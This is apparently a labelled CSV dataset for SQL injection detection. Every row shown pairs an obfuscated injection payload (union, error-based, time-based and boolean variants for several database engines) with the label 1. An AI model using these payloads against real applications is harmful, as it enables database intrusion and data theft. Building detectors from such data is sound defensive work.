Query,Label
"%se%l%%ec%t %like  (  'abcdefg',upper  (  hex  (  r%a%%n%%domblob  (  500000000/2   )    )      )    )   # lchh",1
"1'||  (  s%el%%ec%%t 'uusj' w%h%%e%%r%%e 2149  =  2149 %%or 8384  =  %%l%%i%k%%e  (  'abcdefg',upper  (  hex  (  r%%an%%domblob  (  500000000/2   )    )      )    )     )  ||'",1
"1 a%n%%d extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  s%%e%l%%ec%t   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   # fmxq",1
"-1512 u%n%io%n all s%%e%l%%e%%c%%t 9013,9013,9013,9013#",1
"1' %or 8384  =  like  (  'abcdefg',upper  (  hex  (  r%%a%%n%domblob  (  500000000/2   )    )      )    )   ",1
"1'  )   %%a%n%d char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substr%%ing  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%n%u%l%l  )  ,0  )  ,500000000  )  ,%n%u%l%l  )  --",1
1 waitfor delay '0:0:5'-- nnnp,1
"1' %%o%r 8315  =    (  %%s%%e%l%e%%c%%t count  (  *  )   from sysibm.systa%b%l%%es as t1,sysibm.systa%b%l%%es as t2,sysibm.systa%b%l%%es as t3  )  ",1
1'   )    )    as yqek %%w%%h%er%e 1957  =  1957,1
"1""   )    )     )   a%%n%%d 3715 %%in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  s%el%%e%%c%%t   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   a%%n%%d    (    (     (  ""fjwv"" l%%ik%e ""fjwv",1
1  )   as hggi %%whe%re 6511  =  6511,1
"1'   )    )    o%%r 8384  =  %l%%ik%e  (  'abcdefg',upper  (  hex  (  r%a%%n%%domblob  (  500000000/2   )    )      )    )    %a%%n%%d    (    (   'gxpr'  =  'gxpr",1
"-6662""   )    )    %unio%%n all %s%e%%l%%e%%ct 6755--",1
1'+  (  %se%le%ct 'hplm' %w%he%%r%%e 4008  =  4008 %%a%n%d 8594  =    (  %se%le%ct 8594 %fr%o%m pg_sleep  (  5   )    )   --,1
"1'   )    )     )   %%a%%nd 9254  =    (  %s%%e%lec%t count  (  *  )   fr%%o%m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1""   )    )    %%an%d make_%%se%%t  (  8266  =  9226,9226  )   %%an%d    (    (   ""omjx"" %l%ik%e ""omjx",1
1'||  (  %s%e%%l%e%c%%t 'oxdh' w%here 6967  =  6967 %and sleep  (  5  )  #,1
%s%e%lec%%t   (  case when   (  5698  =  3453  )   then 5698 else 1/  (  %s%e%lec%%t 0  )   end  )  --,1
"-5776%' %u%ni%o%%n all %%s%%e%le%ct 3075,3075,3075,3075,3075--",1
"1'   )    )    as oldh %%w%%h%e%%r%%e 9551  =  9551 u%ni%%o%n all %se%l%%ec%t %n%u%%ll,%n%u%%ll,%n%u%%ll#",1
1 r%%l%i%ke sleep  (  5  )  #,1
1  )   r%%li%k%e   (  se%%l%ec%%t   (  case when   (  5477  =  7492  )   then 1 else 0x28 end   )    )    an%d   (  4427  =  4427,1
"1"" %a%n%%d 6240  =    (  'qqpjq'||  (  %s%%el%%e%%ct case 6240 when 6240 then 1 else 0 end fro%m rdb$da%t%%a%bas%%e  )  ||'qzvzq'  )   %a%n%%d ""sckh""  =  ""sckh",1
"1""  )   wh%er%e 1607  =  1607",1
1%'   )    )    %%o%r   (  %se%%l%ec%t * %f%ro%%m   (  %se%%l%ec%t  (  sleep  (  5   )    )     )  ydpu  )   an%%d    (    (   '%'  =  ',1
"-4194""   )    )     )   %o%%r 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  s%%ele%%c%%t   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   fr%%o%%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   %%a%%n%%d    (    (     (  ""ddbc"" %%l%i%k%%e ""ddbc",1
"1   )    )    as rual %w%%h%%e%%r%e 4649  =  4649 a%n%d   (  sel%%e%%ct 2*  (  if   (    (   sel%%e%%ct * %f%%r%%om   (  sel%%e%%ct concat  (  0x7171706a71,  (  sel%%e%%ct   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
"1%""   )    )    %%u%n%i%o%n all se%%l%e%%c%t %%n%%u%l%l--",1
1'+  (  %se%%lec%%t 'czpg' w%%h%%er%%e 6627  =  6627 %%an%%d 2006  =  2006,1
"%se%l%e%%c%%t count  (  *  )   %%f%%ro%m doma%i%n.doma%i%ns as t1,doma%i%n.columns as t2,doma%i%n.t%a%bl%%es as t3 %a%%n%d    (    (     (  ""%""  =  """,1
1'  )   r%%l%ik%%e   (  s%%el%%ec%t * %%f%%r%om   (  s%%el%%ec%t  (  sleep  (  5   )    )     )  sgvo  )   a%n%d   (  'zqiw'  =  'zqiw,1
-1564'  )   %o%%r%%d%er by 1--,1
"1%' %%uni%%o%%n all s%%e%%le%%ct %nul%%l,%nul%%l,%nul%%l,%nul%%l,%nul%%l,%nul%%l,%nul%%l,%nul%%l,%nul%%l,%nul%%l--",1
"-7060'  )   %%o%r make_%s%e%t  (  4233  =  1689,1689  )   %a%n%d   (  'twpr' l%%i%%ke 'twpr",1
"1'   )    )    u%%n%%i%o%%n all %s%%e%lect %n%u%ll,%n%u%ll,%n%u%ll,%n%u%ll,%n%u%ll,%n%u%ll,%n%u%ll,%n%u%ll,%n%u%ll,%n%u%ll#",1
"1"" %%w%h%e%%r%e 8333  =  8333",1
if  (  6745  =  4078  )   %s%e%%le%%ct 6745 else %%dro%p function ytyt--,1
1%' an%d 1736  =  4220,1
"-7528' or make_se%%t  (  3809  =  1821,1821  )   %and 'kgch'  =  'kgch",1
"-8153' w%he%%r%%e 2436  =  2436 u%ni%%o%%n all s%e%l%e%%ct 2436,2436,2436,2436,2436,2436,2436,2436,2436,2436#",1
"1'||  (  %s%%e%l%%e%%c%t 'fcws' fr%o%%m dual wh%e%re 9184  =  9184 %a%%n%%d %%up%%da%%t%%exml  (  3393,concat  (  0x2e,0x7171706a71,  (  %s%%e%l%%e%%c%t   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'",1
"1""  )   as tecq %%w%%her%%e 4817  =  4817 %%an%%d 8189  =    (  %%s%e%l%%ect count  (  *  )   %%fr%o%m sysibm.sys%t%%a%bles as t1,sysibm.sys%t%%a%bles as t2,sysibm.sys%t%%a%bles as t3  )  --",1
"1"" o%%r elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"1  )   %or   (  s%el%ec%%t 9173 f%%r%o%m  (  s%el%ec%%t count  (  *  )  ,concat  (  0x7171706a71,  (  s%el%ec%%t   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,flo%or  (  ra%nd  (  0  )  *2   )    )   x f%%r%o%m inf%ormation_schema.character_%se%%ts group %%by x  )  a  )   a%nd   (  7984  =  7984",1
1'||  (  s%e%%l%%e%c%t 'bsbv' %fr%o%m dual %wher%e 5276  =  5276 %%or   (  s%e%%l%%e%c%t * %fr%o%m   (  s%e%%l%%e%c%t  (  sleep  (  5   )    )     )  ydpu   )    )   ||',1
"-9810'  )   %wh%%er%e 4361  =  4361 or elt  (  1032  =  1032,3623  )  --",1
"1%""  )   r%%like   (  %%s%%e%%lect * %%fr%%o%m   (  %%s%%e%%lect  (  sleep  (  5   )    )     )  sgvo  )   %a%%n%d   (  ""%""  =  """,1
"1""   )    )    %a%%n%d 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %s%e%le%c%%t   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   %f%%r%%o%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   %a%%n%d    (    (   ""xqlh""  =  ""xqlh",1
1'   )    )    waitf%o%r delay '0:0:5'--,1
"-8093""   )    )    as oboi %%w%he%r%%e 1476  =  1476 %%u%n%i%o%n all %s%e%%l%e%c%t 1476,1476,1476,1476#",1
"1"" w%%here 9341  =  9341",1
"-3703""   )    )     )   %%u%%n%%i%%o%n all %s%el%%e%%c%t 3293,3293,3293,3293,3293,3293,3293,3293,3293,3293#",1
"1   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  %s%ele%%ct   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   %an%%d    (    (     (  7813  =  7813",1
1 %%a%%nd 6240  =    (  'qqpjq'||  (  s%e%%le%c%%t case 6240 when 6240 then 1 else 0 end %f%r%o%%m rdb$d%at%a%%b%as%%e  )  ||'qzvzq'  )  -- izad,1
"%%s%el%%ec%%t count  (  *  )   f%r%o%%m domain.domains as t1,domain.columns as t2,domain.%t%ab%%les as t3  )  ||'",1
"1' %in boolean mode  )   %%o%r 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"-4453'   )    )     )   %%or 1570  =  convert  (  %int,  (  %s%%e%l%ect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  %s%%e%l%ect   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   %%an%d    (    (     (  'boxt'  =  'boxt",1
"-3130  )   u%%n%%i%o%%n all %%s%%el%%ec%%t 1741,1741,1741,1741,1741,1741,1741,1741#",1
"-4233%""  )   %%o%%r   (  8459  =  8459  )  *4906 %%a%nd   (  ""%""  =  """,1
"1   )    )    %%u%ni%%on all s%el%e%%ct %%n%%u%l%%l,%%n%%u%l%%l,%%n%%u%l%%l,%%n%%u%l%%l,%%n%%u%l%%l,%%n%%u%l%%l,%%n%%u%l%%l,%%n%%u%l%%l,%%n%%u%l%%l--",1
"-5528'  )   u%%ni%o%%n all %s%e%%l%%e%ct 5153,5153,5153,5153,5153,5153,5153,5153,5153#",1
"-4589""  )   u%n%%i%o%%n all s%%ele%c%%t 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--",1
"1',  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  s%%e%lect 1 %%fr%%o%m generate_series  (  8979,8979,case when   (  8979  =  8979  )   then 1 else 0 end  )   %l%%i%%mi%%t 1  )  ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ",1
-8224'  )   w%%h%e%r%%e 6504  =  6504 o%r 2461  =  5660,1
"1 w%h%er%e 7196  =  7196 o%r 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1
"1 %%where 6881  =  6881 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  %s%%e%%l%ec%%t   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1
"-5130'   )    )    %%unio%n all s%%elect 5218,5218,5218,5218,5218,5218,5218,5218,5218,5218--",1
"-7797'+  (  s%el%e%%ct oulr %w%h%er%%e 7091  =  7091 %u%%n%%io%%n all s%el%e%%ct 7091,7091,7091,7091,7091,7091,7091,7091,7091#",1
-3125'   )    )     )   %order %b%y 1#,1
"1"" u%%n%i%o%n all %se%%le%%ct %%nu%l%%l,%%nu%l%%l,%%nu%l%%l,%%nu%l%%l,%%nu%l%%l,%%nu%l%%l,%%nu%l%%l,%%nu%l%%l#",1
"1  )   a%nd 5556  =    (  %%s%el%%e%c%t count  (  *  )   %f%%rom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1
-9087 %or 3038  =  3038,1
"1  )   as tgqd %%w%%h%%e%%r%e 6369  =  6369 a%nd 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %s%%e%%l%e%c%t   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   %f%%r%%o%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
end %a%%n%%d 'huti' %%l%%i%k%e 'huti,1
-7346 %or 8571  =  8571--,1
"1""  )   %u%%n%%ion all s%elect %%n%%u%l%%l,%%n%%u%l%%l,%%n%%u%l%%l,%%n%%u%l%%l--",1
-8015  )   %%w%he%%re 9808  =  9808 %o%r 9323  =  9323#,1
"1'   )    )     )   o%%r 4411  =    (  s%e%l%e%ct count  (  *  )   %%f%r%%om sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   a%nd    (    (     (  'gucd'  =  'gucd",1
%s%el%ect   (  case when   (  8978  =  1426  )   then 1 else 8978*  (  %s%el%ect 8978 f%r%o%%m master..sys%%d%a%%t%%a%bas%es  )   end  )  --,1
"1""  )   %o%%r 1022  =    (  %s%e%lect count  (  *  )   f%%rom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
-1192 %o%%r%%d%e%%r %b%y 1#,1
"1""  )   %and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"-9661""   )    )     )   %u%n%%i%o%n all s%el%e%ct 2158,2158,2158--",1
"1%'  )   u%ni%o%n all %%s%%e%l%%e%ct nu%%l%%l,nu%%l%%l,nu%%l%%l,nu%%l%%l,nu%%l%%l,nu%%l%%l,nu%%l%%l,nu%%l%%l,nu%%l%%l,nu%%l%%l--",1
"s%el%%e%%c%%t count  (  *  )   %f%r%o%%m sysibm.syst%%a%%bl%es as t1,sysibm.syst%%a%%bl%es as t2,sysibm.syst%%a%%bl%es as t3 %a%%n%%d   (  ""ihqf""  =  ""ihqf",1
"1'   )    )     )   %a%%n%%d   (  %%s%e%%l%%e%%ct 2*  (  if   (    (   %%s%e%%l%%e%%ct * f%%rom   (  %%s%e%%l%%e%%ct concat  (  0x7171706a71,  (  %%s%e%%l%%e%%ct   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   %a%%n%%d    (    (     (  'sdnc'  =  'sdnc",1
"1"" and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
beg%i%n if   (  5624  =  5624  )   then dbms_lock.sleep  (  5  ) ,1
"1  )   %w%h%%e%%r%%e 2044  =  2044 %%or elt  (  6272  =  6272,sleep  (  5   )    )   --",1
1  )   %%w%he%%re 4573  =  4573,1
"1%' %a%n%%d 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
-8074'  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %%s%e%%lec%%t   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   fr%om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    a%n%d   (  'lnwm'  =  'lnwm,1
"-6123"" %%o%r 5903  =    (  'qqpjq'||  (  %%s%%e%l%e%%c%t case 5903 when 5903 then 1 else 0 end %f%%r%o%%m rdb$%d%a%%ta%%b%as%%e  )  ||'qzvzq'  )   %%a%n%d ""zuzx""  =  ""zuzx",1
"1"" %whe%r%%e 2204  =  2204 an%d 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  %%se%l%%e%ct   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
1'  )   as pogx %w%%he%r%%e 4105  =  4105 an%%d 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  %%s%e%l%%ect   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
"-1949  )   as smyn %w%%h%e%r%%e 4066  =  4066 %%u%nio%n all %%select 4066,4066--",1
"1"" %%w%%h%e%%r%e 9083  =  9083 a%%nd   (  %se%l%%e%c%%t 2*  (  if   (    (   %se%l%%e%c%%t * %%fr%%om   (  %se%l%%e%c%%t concat  (  0x7171706a71,  (  %se%l%%e%c%%t   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
"-7831""   )    )    as krzi %%whe%r%e 3798  =  3798 o%%r%%de%r %%by 1--",1
"-4522""  )   o%r 4144  =    (  %%s%elec%t upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %%s%elec%t   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   %%f%%r%%om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   %%f%%r%%om dual  )   a%n%d   (  ""mbkq""  =  ""mbkq",1
"-2028'   )    )     )   %%u%ni%%o%%n all %s%%el%e%%ct 8698,8698,8698,8698#",1
"1"" %%a%%n%%d char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substri%%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,n%u%ll  )  ,0  )  ,500000000  )  ,n%u%ll  )   %%a%%n%%d ""pmpk"" %l%i%%ke ""pmpk",1
"1""  )   wh%%e%r%%e 4660  =  4660 %o%%r 5286  =    (  %%s%el%e%c%%t count  (  *  )   %%f%r%%om all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1 w%%h%%er%e 6077  =  6077 o%%r char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substr%ing  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,nul%l  )  --",1
"1 o%%r 5286  =    (  se%lect count  (  *  )   %f%r%om all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1
"1 u%n%%i%o%n all %s%%elec%t %nul%l,%nul%l,%nul%l,%nul%l,%nul%l--",1
"-3852'  )   u%n%%ion all s%e%l%ec%%t 3577,3577,3577,3577,3577,3577,3577,3577#",1
"1'   )    )    as jxvv w%%her%%e 6593  =  6593 %%or elt  (  6272  =  6272,sleep  (  5   )    )   --",1
"1  )   wh%%er%e 5232  =  5232 u%n%%i%on all s%%e%%lect n%%u%l%l,n%%u%l%l,n%%u%l%l#",1
"-8943%'  )   un%io%n all s%e%l%e%%ct 7710,7710#",1
"1%' %%u%n%i%o%%n all sel%ec%%t %%n%%ull,%%n%%ull,%%n%%ull,%%n%%ull,%%n%%ull--",1
"-5744  )   %u%%n%i%o%n all se%%l%e%c%t 3617,3617,3617,3617,3617,3617--",1
"1,  (  case when 8260  =  8260 then 1 else %%nu%ll end  )  ",1
1'  )   %o%r sleep  (  5  )  #,1
"1""  )   a%%n%d 3707  =    (  s%ele%%ct count  (  *  )   %%f%rom sysibm.syst%%a%%b%%l%es as t1,sysibm.syst%%a%%b%%l%es as t2,sysibm.syst%%a%%b%%l%es as t3  )   a%%n%d   (  ""tzog"" l%%ike ""tzog",1
"-5996  )   %or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %%se%%l%e%%ct   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   f%r%o%%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1
1'||  (  s%%el%e%ct 'mlwj' %%fr%%o%%m dual w%%h%%e%r%e 4247  =  4247 %%a%n%d 1702  =  8469  )  ||',1
"-4054"" %o%r 2824  =  4788--",1
"1'   )    )     )   %%a%%nd row  (  6237,7469  )  >  (  %s%el%e%c%t count  (  *  )  ,concat  (  0x7171706a71,  (  %s%el%e%c%t   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,flo%o%r  (  r%%a%%nd  (  0  )  *2   )    )   x %f%r%%o%m   (  %s%el%e%c%t 5192 %u%%ni%%o%n %s%el%e%c%t 3785 %u%%ni%%o%n %s%el%e%c%t 3931 %u%%ni%%o%n %s%el%e%c%t 7158  )  a group %%b%y x  )   %%a%%nd    (    (     (  'zxrb'  =  'zxrb",1
"  (  %%se%le%%c%t count  (  *  )   %%fr%%o%%m doma%%i%n.doma%%i%ns as t1,doma%%i%n.columns as t2,doma%%i%n.t%a%%b%%les as t3  )  ",1
"1""   )    )    as vigs %w%he%%re 6175  =  6175 %%o%%r   (  se%lec%%t 2*  (  if   (    (   se%lec%%t * %f%%r%%o%%m   (  se%lec%%t concat  (  0x7171706a71,  (  se%lec%%t   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
1'+  (  s%e%%l%%e%c%t 'dpun' w%h%e%%r%%e 4760  =  4760,1
"1'  )   %%o%%r u%%p%%d%%a%t%exml  (  1808,concat  (  0x2e,0x7171706a71,  (  %s%e%%l%e%%c%%t   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",1
1'+  (  %%s%%e%%l%e%%ct tart %whe%re 9861  =  9861,1
-9555'   )    )     )   %o%r   (  8459  =  8459  )  *4906 %%a%%n%%d    (    (     (  'rwpq' %l%i%k%e 'rwpq,1
"1""  )   as pydh %whe%%r%e 3407  =  3407 %%a%n%%d 6510  =    (  %s%%e%l%%ec%t count  (  *  )   %f%%r%o%%m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1"" %%w%%he%%r%e 1831  =  1831 %%and   (  se%%l%%e%%c%t * fr%om   (  se%%l%%e%%c%t  (  sleep  (  5   )    )     )  gcrr  )  #",1
1   )    )    as goar wh%%er%e 2405  =  2405 %an%d 5927  =  9731--,1
"1'+  (  %s%e%%l%%e%c%%t ounb %%w%h%%e%r%%e 4653  =  4653 %o%%r exp  (  ~  (  %s%e%%l%%e%c%%t * %%fr%om   (  %s%e%%l%%e%c%%t concat  (  0x7171706a71,  (  %s%e%%l%%e%c%%t   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  +'",1
"-9772' %%o%r 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %s%e%%l%%e%%ct   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   %fr%o%%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   %a%%n%d 'igaa'  =  'igaa",1
"-2116%'   )    )     )   %%un%%i%on all se%le%%c%%t 7119,7119,7119,7119,7119--",1
1  )   %%w%%h%e%%r%%e 7729  =  7729,1
"sele%%ct benchmark  (  5000000,md5  (  0x4c4d6142   )    )    a%%nd   (  8126  =  8126",1
"1   )    )    as zdbj %w%%h%e%%r%e 2300  =  2300   (  %s%%e%%lect   (  case when   (  4587  =  4587  )   then regexp_substr%%i%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%%n%%u%l%%l  )  ,0  )  ,500000000  )  ,%%n%%u%l%%l  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   %%fr%o%m   (  v%alues  (  0   )    )     )  --",1
1'+  (  s%el%%e%ct uhsy wh%e%%r%%e 4596  =  4596 a%%n%%d   (  s%el%%e%ct * f%ro%%m   (  s%el%%e%ct  (  sleep  (  5   )    )     )  fzno   )    )   +',1
"1""   )    )    as ogzn %w%%here 6849  =  6849 an%%d 3580  =    (  %se%l%%e%%c%%t count  (  *  )   %f%r%%o%%m doma%i%%n.doma%i%%ns as t1,doma%i%%n.columns as t2,doma%i%%n.%tables as t3  )  --",1
-5580 o%r 4829  =  1968,1
"1  )   %%w%%h%%e%r%e 8630  =  8630 %u%nio%n all s%e%%l%%ec%t n%u%%l%l,n%u%%l%l--",1
"1' %i%%n boolean mode  )   %%uni%%on all %%s%%e%%l%e%%ct %n%%ul%%l,%n%%ul%%l,%n%%ul%%l,%n%%ul%%l,%n%%ul%%l,%n%%ul%%l--",1
1  )   as qkkm %w%h%er%e 8461  =  8461,1
"1""   )    )    %%o%r 8315  =    (  se%l%%e%c%%t count  (  *  )   %f%ro%m sysibm.syst%abl%%es as t1,sysibm.syst%abl%%es as t2,sysibm.syst%abl%%es as t3  )   a%%nd    (    (   ""vypw"" %l%i%k%e ""vypw",1
"-5386'  )   un%%i%%o%%n all %%s%%e%l%e%%ct 8026,8026,8026,8026,8026,8026#",1
1'||  (  s%%e%l%e%%c%t 'dajl' f%%ro%%m dual %w%%he%%re 8440  =  8440,1
1'   )    )    a%%n%d 3715 %%in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  se%le%%c%%t   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   a%%n%d    (    (   'mmow'  =  'mmow,1
"1"" %u%%ni%%o%n all s%%e%l%ec%t n%%ul%%l,n%%ul%%l,n%%ul%%l,n%%ul%%l#",1
1'   )    )    as cjjm %w%%he%re 1981  =  1981,1
"1""  )   w%%h%%e%%r%%e 3507  =  3507",1
1' %%o%%r 6793  =    (  %%se%%l%%e%%c%t 6793 fr%%o%m pg_sleep  (  5   )    )    a%nd 'hokd'  =  'hokd,1
"1'  )   %%o%r elt  (  5873  =  5873,sleep  (  5   )    )   #",1
1'  )   wh%e%%r%%e 3861  =  3861,1
"1""  )   an%%d 9254  =    (  s%el%%ec%t count  (  *  )   %fr%%om rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1""   )    )    r%%li%ke   (  s%e%%lec%%t * %%f%%r%o%m   (  s%e%%lec%%t  (  sleep  (  5   )    )     )  sgvo  )   %and    (    (   ""grct""  =  ""grct",1
"-2417  )   u%n%%i%%on all %s%ele%ct 2169,2169,2169,2169,2169,2169,2169,2169,2169,2169#",1
"-6368' %un%i%o%n all %s%e%%l%%e%c%%t 6529,6529,6529--",1
